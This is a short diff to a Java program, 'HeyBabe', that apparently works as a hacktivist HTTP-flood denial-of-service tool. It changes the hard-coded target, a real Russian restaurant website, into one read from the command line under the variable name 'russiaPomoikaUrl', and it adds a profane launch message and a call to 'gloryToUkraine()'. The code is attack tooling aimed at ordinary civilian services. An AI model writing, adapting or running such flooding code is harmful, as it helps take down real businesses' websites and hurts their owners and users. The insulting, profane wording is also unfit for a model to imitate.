@@ -5,7 +5,12 @@ import static java.util.Objects.nonNull;
 
 public class HeyBabe implements Runnable {
 
+    public static String russiaPomoikaUrl;
+
     public static void main(String[] args) {
+        russiaPomoikaUrl = args[0];
+        System.out.println("Stating to fuck " + russiaPomoikaUrl);
+
         gloryToUkraine();
     }
 
@@ -22,7 +27,7 @@ public class HeyBabe implements Runnable {
         Unirest.setTimeouts(0, 0);
         HttpResponse<String> response = null;
         try {
-            response = Unirest.get("https://tyumen.sushi-master.ru/")
+            response = Unirest.get(russiaPomoikaUrl)
                     .asString();
             if (nonNull(response) && response.getStatus() == 200) {
                 System.out.println("Status code " + response.getStatus());
